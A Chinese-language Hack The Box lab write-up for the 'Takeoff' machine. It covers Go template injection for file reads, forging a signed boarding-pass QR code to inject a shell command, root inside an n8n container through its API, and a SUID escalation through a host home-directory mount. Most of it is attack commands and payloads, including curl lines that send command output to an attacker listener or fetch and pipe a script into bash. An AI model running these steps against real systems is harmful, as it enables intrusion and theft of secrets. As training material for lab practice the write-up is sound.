---
title: "HTB Takeoff Writeup"
date: 2026-11-04
draft: false
description: "航空订票系统把工单备注交给 Go text/template 渲染进 PDF，构成模板注入与任意文件读；用泄露的 HMAC 密钥伪造登机牌二维码，触发签到流程里的命令拼接拿到 www-data；再借 n8n 的公开 API 在容器内取得 root，最后利用容器对宿主家目录的挂载与属主权限制造 SUID 完成提权。"
tags: ["HTB", "Linux", "Hard", "SSTI", "Go", "Docker"]
categories: ["Writeup"]
isStarred: false
---

Takeoff 是一台围绕航空订票系统搭建的 Linux 靶机。前台是一个用 Go 与 Echo 编写的订票站点，功能覆盖航班搜索、选座、支付和登机牌生成。真正的问题出在工单备注：它会被当成模板源码交给 `text/template` 渲染，而渲染结果只出现在生成的 PDF 里，所以从浏览器页面上看不出任何异常。拿到任意文件读之后，服务单元文件里的两个密钥分别打开了登机牌伪造与 n8n 控制台两道门。

| 项目 | 值 |
| :--- | :--- |
| 平台 | Hack The Box |
| 系统 | Linux |
| 难度 | Hard |
| 靶机 IP | 10.129.23.79 |

## 0. 攻击链总览

注册普通账号并完成一次订票之后，工单备注字段可写入 Go 模板表达式，导出 PDF 即可执行，借此读取任意文件并取得 `TICKET_VALIDATION_TOKEN` 与 `N8N_API_KEY`。登机牌二维码是一段自签名的 gob 数据，签名算法为 HMAC-SHA256，密钥正是前者；保持 JSON 长度不变替换其中的通知命令字段并重新签名，提交签到接口即获得以 www-data 身份的命令执行。后者用于登录 n8n 的公开 API，创建一条含命令执行节点的 workflow，取得容器内的 root；该容器的 `/root` 挂载自宿主机用户的家目录，而容器 root 对挂载点拥有属主权限，把宿主机 `/bin/bash` 的副本改成 SUID 即可完成最终提权。

### 工具

| 工具 | 用途 |
| :--- | :--- |
| nmap | 端口与服务识别 |
| curl | 构造 HTTP 请求、回传命令输出 |
| Python 3 | 二维码解码、签名重算、载荷构造 |
| OpenCV | 二维码识别 |
| n8n 公开 API | 容器内的命令执行通道 |

## 1. 侦察

全端口扫描只开放两个服务：

```console
imawuya:~$ nmap -sT -Pn -n -T4 --top-ports 1000 --open 10.129.23.79
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

80 端口由 nginx 反代，响应头暴露后端框架：

```console
imawuya:~$ curl -s -i http://10.129.23.79/ | head -20
HTTP/1.1 200 OK
Server: nginx
X-Powered-By: Echo
Content-Security-Policy: default-src 'self'; ...
```

页面是「HTB Airways Booking」，前端用 HTMX 做局部刷新。功能入口包括注册、登录、航班搜索、选座、支付卡管理与登机牌下载。

## 2. 枚举

注册账号后按正常流程走一遍，目的是把工单页面打开：

```console
imawuya:~$ curl -s -c cj.txt -X POST http://10.129.23.79/sign-up -d "name=Tester&email=tester%40htb.local&password=<password>"
imawuya:~$ curl -s -b cj.txt -c cj.txt -X POST http://10.129.23.79/sign-in -d "email=tester%40htb.local&password=<password>"
```

搜索航班后按 `/book/start`、`/book/<PNR>/passengers`、`/book/<PNR>/payment` 的顺序完成订票。乘客表单除了姓名与证件号，还要求 `id_type`，缺这个字段会返回 `passenger fields mismatched`。支付需要先添加一张卡，卡号字段只接受纯数字，带空格的格式会被拒。

订票完成后，工单详情页暴露两个关键接口：

- `POST /tickets/<PNR>/notes` 写入工单备注
- `GET /tickets/<PNR>/download` 生成 PDF 登机牌

## 3. 初始访问

### 3.1 模板注入

备注内容在页面上原样显示，但下载的 PDF 里会被渲染。先提交一个探针：

```console
imawuya:~$ curl -s -b cj.txt -X POST http://10.129.23.79/tickets/6KTV2K/notes -H "HX-Request: true" --data-urlencode 'notes={{printf "%+v" .}}'
imawuya:~$ curl -s -b cj.txt http://10.129.23.79/tickets/6KTV2K/download -o t.pdf
imawuya:~$ pdftotext -layout t.pdf - | sed -n '/Notes/,/Scan QR/p'
&{Request:0xc000174780 User:...}
```

根对象暴露为 `{Request, User}`，确认是 Go `text/template`。模板方法可以继续调用，`File` 方法提供了任意文件读：

```console
imawuya:~$ curl -s -b cj.txt -X POST http://10.129.23.79/tickets/6KTV2K/notes -H "HX-Request: true" --data-urlencode 'notes={{.File "/etc/passwd"}}'
```

PDF 里返回完整的 passwd，确认两个真实用户：`kpark(1001)` 与 `vmiller(1000)`。

### 3.2 密钥提取

服务运行在 systemd 下，单元文件比 `/proc/self/environ` 更适合做提取，后者会被 PDF 的列宽换行截断：

```console
imawuya:~$ curl -s -b cj.txt -X POST http://10.129.23.79/tickets/6KTV2K/notes -H "HX-Request: true" --data-urlencode 'notes={{.File "/usr/lib/systemd/system/htb-air.service"}}'
```

单元文件给出服务路径、运行用户与两个环境变量：

```
ExecStart=/opt/htb-airways/booking/htb-air
User=www-data
Environment=TICKET_VALIDATION_TOKEN=<token>
Environment=N8N_API_KEY='<key>'
```

### 3.3 登机牌二维码

下载的 PDF 内嵌一张 240x240 的位图。直接按页面渲染解码会失败，需要先把图片取出并补白边：

```console
imawuya:~$ python3 - <<'PY'
import pymupdf, cv2, numpy as np
doc = pymupdf.open('t.pdf')
xref = doc[0].get_images(full=True)[0][0]
img = cv2.imdecode(np.frombuffer(doc.extract_image(xref)['image'], np.uint8), cv2.IMREAD_GRAYSCALE)
m = cv2.copyMakeBorder(img, 20, 20, 20, 20, cv2.BORDER_CONSTANT, value=255)
m = cv2.resize(m, None, fx=3, fy=3, interpolation=cv2.INTER_NEAREST)
print(cv2.QRCodeDetector().detectAndDecode(m)[0])
PY
```

解出的内容是一段 base64。解码后可以拆成四段：

```
[3 字节头][gob 流][明文 JSON][32 字节签名]
```

JSON 里的字段决定了签到行为：

```json
{"PNR":"6KTV2K","Token":"...","Seat":"1A","Passenger":"Tester",
 "NotifyCmd":"check-in-notify --pnr 6KTV2K --email tester@htb.local"}
```

`NotifyCmd` 会被服务端交给 shell 执行，而签名覆盖的是整个 gob 段。先用上一节拿到的 token 验证签名算法：

```python
hmac.new(TICKET_VALIDATION_TOKEN, body[:-32], hashlib.sha256).digest() == body[-32:]
```

gob 流前面有三个字节的头，因此不能直接交给 `gob.Decode`；同时改动 JSON 会破坏 gob 的长度前缀。最省事的做法是保持 JSON 总长不变：把 `NotifyCmd` 的值换成长度相同的命令，尾部用空格补齐，长度字段无需改动。

```python
nb = json.dumps(payload, separators=(',',':')).encode().ljust(160, b' ')[:160]
newbody = body[:88] + nb + body[248:]
out = base64.b64encode(newbody + hmac.new(KEY, newbody, hashlib.sha256).digest()).decode()
```

先验证执行能力，把命令结果外带到自建监听上：

```
NotifyCmd = "curl 10.10.17.46:8000/$(id|base64 -w0)"
```

```console
imawuya:~$ curl -s -b cj.txt -X POST http://10.129.23.79/api/check-in --data-urlencode "qr_data=$QR" -d "gate=WEB"
{"decoded":{"PNR":"6KTV2K",...,"NotifyCmd":"curl ..."},"status":"ok"}

imawuya:~$ # 监听端
10.129.23.79 - - "GET /dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEp..." 404 -
imawuya:~$ echo dWlkPTMzKHd3dy1kYXRhKQ== | base64 -d
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

命令执行确认。把 `NotifyCmd` 固定为拉取脚本执行的形式，之后只需修改脚本内容即可获得稳定通道：

```
curl 10.10.17.46:8000/s|bash
```

## 4. 提权

### 4.1 容器内的 root

宿主机进程里可以看到 n8n 以 root 运行在容器中，监听 127.0.0.1:5678：

```console
www-data@dutybound:/tmp$ ps -eo pid,user,cmd | grep n8n
   1735 root     node /usr/local/bin/n8n
```

用之前拿到的 `N8N_API_KEY` 访问公开 API：

```console
www-data@dutybound:/tmp$ curl -s -H "X-N8N-API-KEY: $KEY" http://127.0.0.1:5678/api/v1/workflows
{"data":[{"id":"...","name":"Schedule Change Alerter",...}]}
```

容器内没有 curl 与 wget，因此不能用命令节点直接外带结果。改用 n8n 自带的 HTTP Request 节点：命令节点把输出写到 `stdout`，HTTP 节点把它 POST 到监听端。workflow 结构为 webhook、executeCommand、httpRequest 三段，创建后激活并触发 webhook 即可。

```json
{"name":"pwn","nodes":[
 {"parameters":{"httpMethod":"POST","path":"pwn","responseMode":"onReceived"},
  "type":"n8n-nodes-base.webhook","typeVersion":2,"webhookId":"pwn"},
 {"parameters":{"command":"id; hostname"}, "type":"n8n-nodes-base.executeCommand"},
 {"parameters":{"method":"POST","url":"http://10.10.17.46:8001/root",
  "sendBody":true,"contentType":"raw","body":"={{$json[\"stdout\"]}}"},
  "type":"n8n-nodes-base.httpRequest","typeVersion":4.2}
]}
```

```console
imawuya:~$ curl -s -X POST -H "X-N8N-API-KEY: $KEY" http://127.0.0.1:5678/api/v1/workflows/<id>/activate
imawuya:~$ curl -s -X POST http://127.0.0.1:5678/webhook/pwn -d '{}'
{"message":"Workflow was started"}
```

容器内确认 `uid=0(root)`。

### 4.2 挂载点与 user flag

容器的挂载表暴露了一条关键信息：

```console
root@f1bfbbddcdd4:/# cat /proc/self/mountinfo | awk '{print $4, $5, $10}'
/home/kpark /root rw,errors=remount-ro
```

容器内的 `/root` 就是宿主机的 `/home/kpark`。因此容器 root 直接读到了 user flag：

```console
root@f1bfbbddcdd4:/# cat /root/user.txt
********************************
```

### 4.3 SUID

容器对挂载点拥有属主权限，这意味着可以在宿主机上制造一个属主为 root 的 SUID 文件。挂载选项里没有 `nosuid`，属主关系跨越容器边界保持为 uid 0。

先在宿主机侧把 bash 复制到家目录：

```console
kpark@dutybound:~$ cp /bin/bash ~/rbash
```

再通过容器修改属主与权限：

```console
root@f1bfbbddcdd4:/# chown 0:0 /root/rbash && chmod 4755 /root/rbash
-rwsr-xr-x 1 root root 1298416 /root/rbash
```

宿主机上以 kpark 身份执行：

```console
kpark@dutybound:~$ ./rbash -p -c 'id; cat /root/root.txt'
uid=1001(kpark) gid=1001(kpark) euid=0(root) groups=1001(kpark)
********************************
```

## 5. 收尾

清理顺序按权限从高到低：

1. 删除容器内设置的 SUID 文件，即宿主机的 `~/rbash`
2. 删除宿主家目录下用于登录的 `authorized_keys`
3. 删除自建的 n8n workflow
4. 关闭本地监听端口

本次操作中，清理 n8n workflow 时使用了「遍历全部 workflow 并逐个删除」的写法，误将靶机自带的业务 workflow 一并删除。n8n 的删除接口是真删除，数据库内不留记录，无法从 sqlite 恢复，只能通过重置靶机还原。正确的做法是按 ID 精确删除，或删除前先记录全部条目的名称。

## 附录：走过的弯路与兔子洞

**PDF 文本截断。** 最初从 `/proc/self/environ` 读 token，`pdftotext` 会按列宽在固定位置换行，长字符串被切成两段且拼接点不确定。改用 systemd 单元文件后问题消失，因为该文件本身具备换行结构。

**gob 解码失败。** 二维码内容看似标准 gob 流，但前面附加了三个字节的头，直接 `gob.Decode` 会报 `type mismatch` 或 `field numbers out of bounds`。尝试过用 Go 重新编码整个结构，生成的类型描述与原始数据不一致，原始数据带 `*gob.` 前缀的接口类型定义。最终放弃重新编码，改为等长替换。

**签名覆盖范围。** 一开始假设签名只覆盖 JSON，验证后发现 HMAC 的输入是包含 gob 头在内的整个前半段，因此 JSON 长度变化会导致签名与数据不匹配，这也是选择等长替换的直接原因。

**n8n 容器缺少下载工具。** 命令节点最初写成先 curl 再回传，执行报 `/bin/sh: curl: not found`。容器内既无 curl 也无 wget，改用 n8n 的 HTTP Request 节点外带。

**命令节点退出码。** `executeCommand` 节点在命令返回非零时直接抛错，后续节点不再执行，表现为 webhook 触发但监听端收不到任何数据。在命令末尾追加 `; true` 后恢复正常。

**容器逃逸的错误假设。** 看到 `/proc/1/root` 可读，一度以为容器共享宿主 PID 命名空间可以直接读取宿主根目录。实际上该路径指向的是容器自身的根。检查 `CapEff` 为 `0xa80425fb`，即 Docker 默认能力集，不含 `SYS_ADMIN`，不具备挂载逃逸条件。真正的出口是那个挂载点。
